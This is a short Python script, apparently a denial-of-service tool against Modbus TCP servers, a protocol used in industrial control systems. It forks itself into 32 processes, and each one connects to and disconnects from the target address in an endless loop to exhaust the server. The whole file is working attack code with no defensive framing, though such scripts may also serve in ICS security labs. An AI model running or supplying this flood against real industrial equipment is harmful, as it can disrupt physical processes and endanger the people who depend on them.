#!/usr/bin/env python3

# Import required pymodbus classes
from pymodbus.client import ModbusTcpClient
import logging
import sys
import argparse
import os

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-a", "--address", required=True, help="Server Address")
    parser.add_argument("-p", "--port", required=False, default=502, help="Server port")
    args = parser.parse_args()

    logging.basicConfig()
    log = logging.getLogger()
    log.setLevel(logging.INFO)

    client = ModbusTcpClient(host=args.address, port=args.port) 

    for instance in range(5):
        os.fork()

    while(True):
        if client.connect():
            client.close()
        else:
            print("Failed to connect to Modbus server.")

if __name__ == "__main__":
    main()